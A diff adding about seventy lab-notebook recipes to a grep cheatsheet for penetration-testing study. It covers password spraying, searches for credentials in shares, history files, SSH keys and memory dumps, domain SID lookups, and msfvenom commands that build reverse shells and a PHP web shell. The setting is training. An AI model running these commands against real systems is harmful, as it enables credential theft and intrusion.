@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=grep) · [All tools](/index)
+
 ## Commands
 
 **Linux target**
@@ -22,8 +24,1066 @@ grep -n "PATTERN" file.txt
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=grep)
+## Notebook recipes
 
-## Learning and original examples
+70 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [Find Credentials on Linux](/password-attacks/credential-hunting-in-linux)
+<AccordionGroup>
+
+<Accordion title="Password Spraying - Making a target user list">
+
+### Password Spraying - Making a target user list
+
+**AD Password Policies and User Lists**
+
+```bash
+enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+```
+
+</Accordion>
+
+<Accordion title="using ldap search">
+
+### using ldap search
+
+**AD Password Policies and User Lists**
+
+```bash
+grcic550@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
+```
+
+</Accordion>
+
+<Accordion title="2. Password spraying">
+
+### 2. Password spraying
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+# SSH spray (Hydra)
+hydra -L usernames.txt -p 'Texas123!@#' <DMZ_IP> ssh
+#   -> [22][ssh] login: jbetty  password: Texas123!@#
+
+# SMB spray once internal (NetExec) — ONE password across users:
+nxc smb <DC> -u usernames.txt -p 'Texas123!@#' --continue-on-success | grep '[+]'
+```
+
+</Accordion>
+
+<Accordion title="5. Credential hunting (Linux)">
+
+### 5. Credential hunting (Linux)
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+sudo -l                                               # #1 — instant win if misconfigured
+cat ~/.bash_history; cat /home/*/.bash_history 2>/dev/null
+history | grep -iE "ssh|mysql|psql|password|sshpass|curl|wget"
+ls -la ~/.ssh /home/*/.ssh 2>/dev/null                # keys to pivot with
+grep -riI "pass\|secret\|cred" /etc /opt /var/www /home 2>/dev/null | grep -v Binary
+# Kerberos artifacts (domain-joined Linux) -> Pass-the-Ticket:
+find / -name '*.keytab' 2>/dev/null; ls -la /etc/krb5.keytab 2>/dev/null
+ls -la /tmp/krb5cc_* 2>/dev/null; env | grep KRB5
+```
+
+</Accordion>
+
+<Accordion title="Internal password spraying from linux">
+
+### Internal password spraying from linux
+
+**Active Directory Password Spraying**
+
+```bash
+for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
+```
+
+**Active Directory Password Spraying**
+
+```bash
+sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Welcome1 | grep +
+```
+
+</Accordion>
+
+<Accordion title="7. Stage 2 — discovering the real payload is still hidden">
+
+### 7. Stage 2 — discovering the real payload is still hidden
+
+**Android Banking Trojan: Reverse-Engineering Walkthrough**
+
+```bash
+# Following the chain — read one, see what it calls, repeat
+cat stage2_jadx/sources/org/core/Btblwin.java
+grep -rn "Wjpye\." stage2_jadx/sources/ --include="*.java"
+```
+
+</Accordion>
+
+<Accordion title="DIG - MX Records">
+
+### DIG - MX Records
+
+**Attacking Email Services: Module Notes**
+
+```text
+grcic550@htb[/htb]$ dig mx plaintext.do | grep "MX" | grep -v ";"
+
+plaintext.do.           7076    IN      MX      50 mx3.zoho.com.
+plaintext.do.           7076    IN      MX      10 mx.zoho.com.
+plaintext.do.           7076    IN      MX      20 mx2.zoho.com.
+```
+
+**Attacking Email Services: Module Notes**
+
+```text
+grcic550@htb[/htb]$ dig mx inlanefreight.com | grep "MX" | grep -v ";"
+
+inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.
+```
+
+</Accordion>
+
+<Accordion title="CE (BloodHound Community Edition, Docker) — current/recommended">
+
+### CE (BloodHound Community Edition, Docker) — current/recommended
+
+**BloodHound: Full Reference**
+
+```bash
+sudo apt install -y docker.io docker-compose          # 'docker-compose' is the v2 standalone on Kali
+sudo systemctl start docker
+curl -L https://ghst.ly/getbhce -o ~/bh.compose.yml   # note: saves as bh.compose.yml (dot)
+sudo docker-compose -f ~/bh.compose.yml up -d
+sudo docker-compose -f ~/bh.compose.yml logs | grep -i "Initial Password"   # one-time admin pw
+```
+
+</Accordion>
+
+<Accordion title="Grabbing the Domain SID &amp; Attaching to Enterprise Admin&#x27;s RID">
+
+### Grabbing the Domain SID & Attaching to Enterprise Admin's RID
+
+**Child to Parent Trusts - Linux**
+
+```shellsession
+grcic550@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
+
+Password:
+[*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114
+498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
+500: INLANEFREIGHT\administrator (SidTypeUser)
+501: INLANEFREIGHT\guest (SidTypeUser)
+502: INLANEFREIGHT\krbtgt (SidTypeUser)
+512: INLANEFREIGHT\Domain Admins (SidTypeGroup)
+513: INLANEFREIGHT\Domain Users (SidTypeGroup)
+514: INLANEFREIGHT\Domain Guests (SidTypeGroup)
+515: INLANEFREIGHT\Domain Computers (SidTypeGroup)
+516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)
+517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)
+518: INLANEFREIGHT\Schema Admins (SidTypeGroup)
+519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)
+```
+
+</Accordion>
+
+<Accordion title="Looking for the Domain SID">
+
+### Looking for the Domain SID
+
+**Child to Parent Trusts - Linux**
+
+```shellsession
+grcic550@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
+
+Password:
+
+[*] Domain SID is: S-1-5-21-2806153819-209893948-922872689
+```
+
+</Accordion>
+
+<Accordion title="How to spot it on a scan">
+
+### How to spot it on a scan
+
+**Citrix NetScaler: CVE-2019-19781 Reference**
+
+```bash
+# Fingerprint the web service
+curl -sik https://<TARGET>/ | grep -iE 'citrix|netscaler|nsc_'
+whatweb https://<TARGET>/
+
+# nmap service + the CVE detection script (see below)
+sudo nmap -p443 -sV --script ssl-cert <TARGET>
+```
+
+</Accordion>
+
+<Accordion title="Enumeration">
+
+### Enumeration
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ dig mx plaintext.do | grep "MX" | grep -v ";"
+```
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ dig mx inlanefreight.com | grep "MX" | grep -v ";"
+```
+
+</Accordion>
+
+<Accordion title="Forced Authentication Attacks">
+
+### Forced Authentication Attacks
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='
+
+SMB = Off
+```
+
+</Accordion>
+
+<Accordion title="Linux">
+
+### Linux
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ grep -rn /mnt/Finance/ -ie cred
+
+/mnt/Finance/Contracts/private/credentials.txt:1:admin:SecureCredentials!
+/mnt/Finance/Contracts/private/secret.txt:1:file with all credentials
+```
+
+</Accordion>
+
+<Accordion title="Linux shell — inspect context">
+
+### Linux shell — inspect context
+
+**Container and Docker checks**
+
+```bash
+id
+cat /proc/1/cgroup
+ls -l /.dockerenv /var/run/docker.sock
+cat /proc/self/status | grep -E 'Cap|Seccomp'
+```
+
+</Accordion>
+
+<Accordion title="Attempting a Zone Transfer">
+
+### Attempting a Zone Transfer
+
+**DNS and Web Reconnaissance: Full Workflow**
+
+```bash
+# Example with grep to find specific IPs
+dig axfr @10.129.110.47 inlanefreight.htb | grep '\.200\.'
+```
+
+</Accordion>
+
+<Accordion title="Regex vs Shell Globs">
+
+### Regex vs Shell Globs
+
+**DNS and Web Reconnaissance: Full Workflow**
+
+```bash
+# WRONG — shell glob inside grep
+grep "*.*.200.*" 
+
+# RIGHT — regex with escaped dots
+grep '\.200\.'
+```
+
+</Accordion>
+
+<Accordion title="1. Domain-prefixed accounts (highest signal)">
+
+### 1. Domain-prefixed accounts (highest signal)
+
+**Find Credentials in Network Shares**
+
+```bash
+# the gold filter - DOMAIN\username syntax
+grep -ri "${DOMAIN}\\\\" . 2>/dev/null
+
+# UPN format
+grep -riE "[a-zA-Z0-9._-]+@inlanefreight\.local" . 2>/dev/null
+```
+
+</Accordion>
+
+<Accordion title="10. Use ripgrep — much faster and handles more">
+
+### 10. Use ripgrep — much faster and handles more
+
+**Find Credentials in Network Shares**
+
+```bash
+sudo apt install ripgrep -y
+
+# fast recursive search excluding noise
+rg -i "password|cred|secret|${DOMAIN}\\\\" --glob '!Tools/**' --glob '!*.dll' --glob '!*.exe'
+
+# show context
+rg -i -C 2 "passw" --glob '!Tools/**'
+
+# only filenames
+rg -li "passw" --glob '!Tools/**'
+```
+
+</Accordion>
+
+<Accordion title="2. Cred-context keywords (medium-high signal)">
+
+### 2. Cred-context keywords (medium-high signal)
+
+**Find Credentials in Network Shares**
+
+```bash
+# password / pwd / passwd with assignment
+grep -riE "(pass(word)?|pwd|passwd)[[:space:]]*[:=][[:space:]]*\S+" . 2>/dev/null | grep -v Tools/
+
+# variations - localized & abbreviated
+grep -riE "passw|kennwort|contraseña|mot.de.passe|senha" . 2>/dev/null
+
+# user/account context
+grep -riE "(username|userid|account|login)[[:space:]]*[:=]" . 2>/dev/null | grep -v Tools/
+```
+
+</Accordion>
+
+<Accordion title="3. Credential-handling patterns in scripts">
+
+### 3. Credential-handling patterns in scripts
+
+**Find Credentials in Network Shares**
+
+```bash
+# PowerShell cred patterns - extremely high signal
+grep -riE "ConvertTo-SecureString|New-PSCredential|PSCredential|-AsPlainText" . 2>/dev/null
+grep -riE "Invoke-Command.*-Credential|New-PSSession.*-Credential" . 2>/dev/null
+
+# Windows command-line auth
+grep -riE "net use .*\\\\.*/user:|runas.*\/user:|psexec.*-u " . 2>/dev/null
+
+# connection strings
+grep -riE "(server|data source|host)=.*;.*(user|uid)=.*;.*(pass|pwd)=" . 2>/dev/null
+```
+
+</Accordion>
+
+<Accordion title="4. API/token/key patterns">
+
+### 4. API/token/key patterns
+
+**Find Credentials in Network Shares**
+
+```bash
+grep -riE "(api[_-]?key|api[_-]?token|secret[_-]?key|access[_-]?token|bearer)[[:space:]]*[:=]" . 2>/dev/null
+grep -riE "aws_access_key_id|aws_secret_access_key" . 2>/dev/null
+
+# obvious high-entropy / base64-ish blocks near "key" or "secret"
+grep -riE "[A-Za-z0-9+/]{40,}" . 2>/dev/null | grep -iE "key|secret|token"
+```
+
+</Accordion>
+
+<Accordion title="5. Filename-based hunting">
+
+### 5. Filename-based hunting
+
+**Find Credentials in Network Shares**
+
+```bash
+# files with interesting names
+find . -type f \( -iname "*pass*" -o -iname "*cred*" -o -iname "*secret*" -o -iname "*config*" -o -iname "*backup*" -o -iname "*initial*" -o -iname "unattend*" -o -iname "sysprep*" -o -iname "autounattend*" \) 2>/dev/null | grep -v Tools/
+
+# password manager databases
+find . -type f \( -iname "*.kdbx" -o -iname "*.psafe3" -o -iname "*.1pux" \) 2>/dev/null
+
+# files by interesting extension
+find . -type f \( -iname "*.ini" -o -iname "*.cfg" -o -iname "*.conf" -o -iname "*.config" -o -iname "*.env" -o -iname "*.ps1" -o -iname "*.bat" -o -iname "*.cmd" -o -iname "*.vbs" -o -iname "*.xml" \) 2>/dev/null | grep -v Tools/
+```
+
+</Accordion>
+
+<Accordion title="6. GPP / SYSVOL gold">
+
+### 6. GPP / SYSVOL gold
+
+**Find Credentials in Network Shares**
+
+```bash
+# cpassword in any XML (GPP)
+grep -ri "cpassword" . 2>/dev/null
+
+# autologon in Registry.pol
+strings SYSVOL/**/Registry.pol 2>/dev/null | grep -iE "DefaultPassword|DefaultUserName|AutoAdminLogon"
+```
+
+</Accordion>
+
+<Accordion title="7. Show context around matches (super useful)">
+
+### 7. Show context around matches (super useful)
+
+**Find Credentials in Network Shares**
+
+```bash
+# show 3 lines of context - critical for matching user to password
+grep -riE -C 3 "password" . 2>/dev/null | grep -v Tools/
+
+# show filename + line + match
+grep -rniE "passw" . 2>/dev/null | grep -v Tools/
+```
+
+</Accordion>
+
+<Accordion title="8. One-liner that combines the most useful filters">
+
+### 8. One-liner that combines the most useful filters
+
+**Find Credentials in Network Shares**
+
+```bash
+grep -rniE "(${DOMAIN}\\\\|passw|pwd[[:space:]]*[:=]|cpassword|ConvertTo-SecureString|api[_-]?key|secret[_-]?key)" . 2>/dev/null | grep -v Tools/
+```
+
+</Accordion>
+
+<Accordion title="9. Beyond plaintext — handle binary docs">
+
+### 9. Beyond plaintext — handle binary docs
+
+**Find Credentials in Network Shares**
+
+```bash
+# convert all office docs to txt
+mkdir -p /tmp/converted
+find . -type f \( -iname "*.docx" -o -iname "*.xlsx" -o -iname "*.pdf" -o -iname "*.pptx" \) 2>/dev/null | while read f; do
+  libreoffice --headless --convert-to txt "$f" --outdir /tmp/converted >/dev/null 2>&1
+done
+
+grep -riE "passw|${DOMAIN}\\\\|cred" /tmp/converted/
+```
+
+</Accordion>
+
+<Accordion title="Find Credentials in Network Shares">
+
+### Find Credentials in Network Shares
+
+**Find Credentials in Network Shares**
+
+```bash
+grep -ri "passw" .
+```
+
+**Find Credentials in Network Shares**
+
+```bash
+# the domain prefix (most reliable signal)
+grep -ri "DOMAINNAME\\\\" .
+
+# UPN format
+grep -riE "[a-z]+@domain\.local" .
+
+# runas / net use / Invoke-Command patterns - operators leak creds in commands
+grep -riE "runas|net use|Invoke-Command|New-PSSession|ConvertTo-SecureString" .
+
+# anything with "service account" / "svc_" in filenames
+find . -iname "*svc*" -o -iname "*service*account*"
+```
+
+</Accordion>
+
+<Accordion title="Find Credentials on Linux">
+
+### Find Credentials on Linux
+
+**Find Credentials on Linux**
+
+```bash
+for l in $(echo ".conf .config .cnf");do echo -e "\nFile extensions: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core";done
+```
+
+**Find Credentials on Linux**
+
+```bash
+for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
+```
+
+**Find Credentials on Linux**
+
+```bash
+for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
+```
+
+**Find Credentials on Linux**
+
+```bash
+for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
+```
+
+**Find Credentials on Linux**
+
+```bash
+for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done
+```
+
+**Find Credentials on Linux**
+
+```bash
+ls -l .mozilla/firefox/ | grep default
+```
+
+</Accordion>
+
+<Accordion title="Files to Always Check">
+
+### Files to Always Check
+
+**Footprinting: Service-by-Service Lab Workflow**
+
+```bash
+# History files (often contain passwords in commands)
+cat ~/.bash_history
+cat ~/.mysql_history
+cat ~/.viminfo
+
+# SSH keys
+ls -la ~/.ssh/
+cat ~/.ssh/id_rsa
+cat ~/.ssh/authorized_keys
+
+# Mail
+ls -la ~/Maildir/cur/
+cat ~/Maildir/cur/*
+ls -la ~/mail/
+
+# Other users
+cat /etc/passwd | grep -v nologin | grep -v false
+ls /home/
+
+# Find files by name
+find / -iname "*htb*" 2>/dev/null
+find / -iname "*password*" 2>/dev/null
+find / -iname "*config*" 2>/dev/null
+
+# Windows equivalents
+dir C:\Users
+type C:\Users\<user>\Desktop\flag.txt
+```
+
+</Accordion>
+
+<Accordion title="Phase 0 — External / Infrastructure Recon">
+
+### Phase 0 — External / Infrastructure Recon
+
+**Footprinting: Service-by-Service Lab Workflow**
+
+```bash
+# Certificate Transparency — pull subdomains from issued SSL certs
+curl -s "https://crt.sh/?q=<target-domain>&output=json" | jq .
+
+# Resolve a subdomain list to the hosts actually reachable on the internet
+for i in $(cat subdomainlist); do host $i | grep "has address" | grep <target-domain> | cut -d" " -f1,4; done
+
+# Build an IP list, then enrich each with Shodan (exposed services/metadata)
+for i in $(cat subdomainlist); do host $i | grep "has address" | grep <target-domain> | cut -d" " -f4 >> ip-addresses.txt; done
+for i in $(cat ip-addresses.txt); do shodan host $i; done
+```
+
+</Accordion>
+
+<Accordion title="SNMP (Port 161 UDP)">
+
+### SNMP (Port 161 UDP)
+
+**Footprinting: Service-by-Service Lab Workflow**
+
+```bash
+# SNMPv2c — try common community strings
+snmpwalk -v2c -c public <IP>
+snmpwalk -v2c -c private <IP>
+snmpwalk -v2c -c backup <IP>
+
+# Brute force community strings
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>
+
+# SNMPv3 — try noAuthNoPriv (no password needed if misconfigured)
+for user in root admin backup htb administrator; do
+    echo "=== Trying: $user ==="
+    snmpwalk -v3 -l noAuthNoPriv -u "$user" <IP> 2>/dev/null | head -3
+done
+
+# SNMPv3 with auth
+snmpwalk -v3 -l authNoPriv -u <user> -a SHA -A "<password>" <IP>
+
+# Filter useful info from SNMP dump
+snmpwalk -v2c -c <community> <IP> | grep -i "user\|pass\|login\|htb"
+```
+
+</Accordion>
+
+<Accordion title="4. Reading &amp; filtering output (the pentest workhorses)">
+
+### 4. Reading & filtering output (the pentest workhorses)
+
+**Kali Terminal, tmux, zsh, and Vim**
+
+```bash
+cmd | grep foo                 # keep lines matching foo
+cmd | grep -v foo              # drop lines matching foo
+cmd | grep -E "80|443"         # match 80 OR 443 (regex)
+cmd | awk '{print $1}'         # print 1st column
+cmd | cut -d: -f1 /etc/passwd  # split on ":" take field 1
+cmd | sort | uniq -c | sort -rn  # count & rank unique lines
+cmd | wc -l                    # count lines
+cmd | tee out.txt              # show on screen AND save to file
+cmd > out.txt                  # save (overwrite)
+cmd >> out.txt                 # append
+cmd 2>/dev/null                # discard errors
+cmd &>/dev/null                # discard everything
+```
+
+</Accordion>
+
+<Accordion title="5. Processes &amp; jobs">
+
+### 5. Processes & jobs
+
+**Kali Terminal, tmux, zsh, and Vim**
+
+```bash
+Ctrl+c              # kill the running foreground command
+Ctrl+z              # SUSPEND it (pauses, gives prompt back)
+bg                  # resume the suspended job in background
+fg                  # bring it back to foreground
+jobs                # list background/suspended jobs
+cmd &               # run in background from the start
+ps aux | grep ssh   # find a process
+kill <PID>          # terminate by PID
+kill -9 <PID>       # force kill
+pkill nmap          # kill by name
+htop                # interactive process viewer (apt install htop)
+```
+
+</Accordion>
+
+<Accordion title="Finding things">
+
+### Finding things
+
+**Kali Terminal, tmux, zsh, and Vim**
+
+```bash
+find / -name "*.conf" 2>/dev/null      # find by name, hide permission errors
+find . -type f -mmin -10               # files modified in last 10 min
+locate sqlmap                          # fast name search (run: sudo updatedb first)
+which nmap                             # path of a command
+whereis nmap
+grep -ri "password" /etc 2>/dev/null   # recursive, case-insensitive search in files
+```
+
+</Accordion>
+
+<Accordion title="Cron jobs">
+
+### Cron jobs
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+/etc/init.d
+/etc/cron*
+/etc/crontab
+/etc/cron.allow
+/etc/cron.d 
+/etc/cron.deny
+/etc/cron.daily
+/etc/cron.hourly
+/etc/cron.monthly
+/etc/cron.weekly
+/etc/sudoers
+/etc/exports
+/etc/anacrontab
+/var/spool/cron
+/var/spool/cron/crontabs/root
+
+crontab -l
+ls -alh /var/spool/cron;
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny*
+```
+
+</Accordion>
+
+<Accordion title="Files containing passwords">
+
+### Files containing passwords
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null
+find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
+```
+
+</Accordion>
+
+<Accordion title="In memory passwords">
+
+### In memory passwords
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+strings /dev/mem -n10 | grep -i PASS
+```
+
+**Linux Privilege Escalation: Full Checklist**
+
+```ps1
+# Find PID
+ps -eo pid,command
+
+# Core dump PID
+gcore <pid> -o dumpfile
+
+# Search for passwords
+strings -n 5 dumpfile | grep -i pass
+```
+
+</Accordion>
+
+<Accordion title="Last edited files">
+
+### Last edited files
+
+**Linux Privilege Escalation: Full Checklist**
+
+```powershell
+find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
+```
+
+</Accordion>
+
+<Accordion title="SSH Key Predictable PRNG (Authorized_Keys) Process">
+
+### SSH Key Predictable PRNG (Authorized_Keys) Process
+
+**Linux Privilege Escalation: Full Checklist**
+
+```ps1
+grep -lr 'AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf'
+dsa/1024/68b329da9893e34099c7d8ad5cb9c940-17934.pub
+```
+
+</Accordion>
+
+<Accordion title="Key commands">
+
+### Key commands
+
+**Linux Remote Access: SSH, Rsync, and R-Services**
+
+```bash
+ssh -v user@<IP>                                   # verbose: shows offered auth methods
+ssh -v user@<IP> -o PreferredAuthentications=password   # force password (for brute-force)
+ssh -i id_rsa user@<IP>                            # key-based (chmod 600 the key first)
+cat /etc/ssh/sshd_config | grep -v "#" | sed -r '/^\s*$/d'   # read server config (if on host)
+```
+
+</Accordion>
+
+<Accordion title="msfvenom — generate standalone payloads">
+
+### msfvenom — generate standalone payloads
+
+**Metasploit Framework: Startup to Sessions**
+
+```bash
+# Linux ELF reverse shell
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f elf -o shell.elf
+
+# Windows EXE meterpreter
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o shell.exe
+
+# PHP web shell
+msfvenom -p php/meterpreter_reverse_tcp LHOST=tun0 LPORT=4444 -f raw -o shell.php
+
+# List formats / payloads
+msfvenom --list formats
+msfvenom --list payloads | grep windows
+```
+
+</Accordion>
+
+<Accordion title="Locating &amp; Retrieving GPP Passwords with CrackMapExec">
+
+### Locating & Retrieving GPP Passwords with CrackMapExec
+
+**Miscellaneous Misconfigurations**
+
+```shellsession
+grcic550@htb[/htb]$ crackmapexec smb -L | grep gpp
+
+[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
+[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
+```
+
+</Accordion>
+
+<Accordion title="Output formats (always save your scans)">
+
+### Output formats (always save your scans)
+
+**Nmap: Host Discovery, Scanning, and Output**
+
+```bash
+nmap -oN scan.txt <target>         # normal, human-readable
+nmap -oG scan.grep <target>        # greppable (easy to awk/grep)
+nmap -oX scan.xml <target>         # XML (feeds other tools, e.g. metasploit db_import)
+nmap -oA scan <target>             # all three at once (scan.nmap/.gnmap/.xml)
+```
+
+</Accordion>
+
+<Accordion title="Check Domain Membership">
+
+### Check Domain Membership
+
+**Pass the Ticket from Linux**
+
+```bash
+sudo grep -i "access\|allow\|simple" /etc/sssd/sssd.conf   # look for simple_allow_groups / simple_allow_users
+```
+
+</Accordion>
+
+<Accordion title="Check SSSD / Winbind">
+
+### Check SSSD / Winbind
+
+**Pass the Ticket from Linux**
+
+```bash
+ps -ef | grep -i "sssd\|winbind"
+```
+
+</Accordion>
+
+<Accordion title="Identify Current ccache">
+
+### Identify Current ccache
+
+**Pass the Ticket from Linux**
+
+```bash
+env | grep KRB5
+```
+
+</Accordion>
+
+<Accordion title="Step 3 — Verify the tunnel is actually up">
+
+### Step 3 — Verify the tunnel is actually up
+
+**Pass the Ticket from Linux**
+
+```bash
+ss -tlnp | grep 1080        # should show something LISTENING on 127.0.0.1:1080
+```
+
+</Accordion>
+
+<Accordion title="4. Hashcat">
+
+### 4. Hashcat
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+hashcat --help | grep -i ntlm        # search the mode list
+hashid -m '$1$FNr44XZC$wQxY6...'      # -m = print the Hashcat mode number
+```
+
+</Accordion>
+
+<Accordion title="BitLocker-encrypted drives">
+
+### BitLocker-encrypted drives
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+bitlocker2john -i Backup.vhd > backup.hashes
+grep "bitlocker\$0" backup.hashes > backup.hash      # $0 = the password hash (the others are recovery-key hashes)
+hashcat -a 0 -m 22100 backup.hash /usr/share/wordlists/rockyou.txt
+```
+
+</Accordion>
+
+<Accordion title="Cracking modes">
+
+### Cracking modes
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+grep '# Incremental modes' -A 100 /etc/john/john.conf   # view built-in charsets
+```
+
+</Accordion>
+
+<Accordion title="Hunting for SSH private keys">
+
+### Hunting for SSH private keys
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
+```
+
+</Accordion>
+
+<Accordion title="Hunting for encrypted files">
+
+### Hunting for encrypted files
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+for ext in $(echo ".xls .xls* .xltx .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
+```
+
+</Accordion>
+
+<Accordion title="🔁 Mutating a known OLD password (the stom case)">
+
+### 🔁 Mutating a known OLD password (the stom case)
+
+**Password Attacks: Cracking, Files, and Credential Stores**
+
+```bash
+# 1. base word
+echo 'fails-nibble-disturb4' > base.txt
+# 2. generate variants with rules (increment digit, toggle case, append symbol/year)
+hashcat --stdout base.txt -r /usr/share/hashcat/rules/best64.rule | sort -u > muts.txt
+# tight hand-list when lockout is a risk:
+printf '%s\n' fails-nibble-disturb5 fails-nibble-disturb6 Fails-nibble-disturb4 \
+  fails-nibble-disturb4! fails-nibble-disturb5! fails-nibble-disturb2025 fails-nibble-disturb2026 >> muts.txt
+# 3. spray the mutations (CAREFULLY — see lockout below)
+proxychains nxc smb <DC> -u <user> -p muts.txt --continue-on-success | grep '[+]'
+```
+
+</Accordion>
+
+<Accordion title="Identifying Your Shell">
+
+### Identifying Your Shell
+
+**Shells, Payloads, and Interactive TTYs**
+
+```bash
+# Linux — check running processes
+ps
+#   PID TTY      TIME CMD
+#  4232 pts/1    00:00:00 bash     ← this tells you it's bash
+
+# Linux — check SHELL environment variable
+env | grep SHELL
+# SHELL=/bin/bash
+
+# PowerShell — version check (works on both Windows and Linux)
+$PSVersionTable
+# If this returns version info → you're in PowerShell
+# If it errors → you're in cmd.exe or bash
+```
+
+</Accordion>
+
+<Accordion title="EoP - Processes Enumeration and Tasks">
+
+### EoP - Processes Enumeration and Tasks
+
+**Windows Privilege Escalation: Full Checklist**
+
+```powershell
+schtasks /query /fo LIST 2>nul | findstr TaskName
+schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
+Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+```
+
+</Accordion>
+
+<Accordion title="Recommended attack order">
+
+### Recommended attack order
+
+**Find Credentials in Network Shares**
+
+Context from the notebook: grep -ri "$&#123;DOMAIN&#125;\\\\"  ←  always start here
+
+```text
+grep -ri "${DOMAIN}\\\\"
+```
+
+**Find Credentials in Network Shares**
+
+Context from the notebook: grep -ri "cpassword"  ← instant GPP win if present
+
+```text
+grep -ri "cpassword"
+```
+
+**Find Credentials in Network Shares**
+
+Context from the notebook: Context grep:  grep -riE -C 3 "passw"  to pair users with passwords
+
+```text
+grep -riE -C 3 "passw"
+```
+
+</Accordion>
+
+<Accordion title="2. chisel (SOCKS + port forwards)">
+
+### 2. chisel (SOCKS + port forwards)
+
+**Pivoting and File Transfer: Field Reference**
+
+Context from the notebook: R:  =  reverse  (pivot connects out to Kali — works through egress firewalls). Match the SOCKS port to proxychains. Verify it's up:  ss -tlnp | grep 1080 .
+
+```text
+ss -tlnp | grep 1080
+```
+
+</Accordion>
+
+</AccordionGroup>
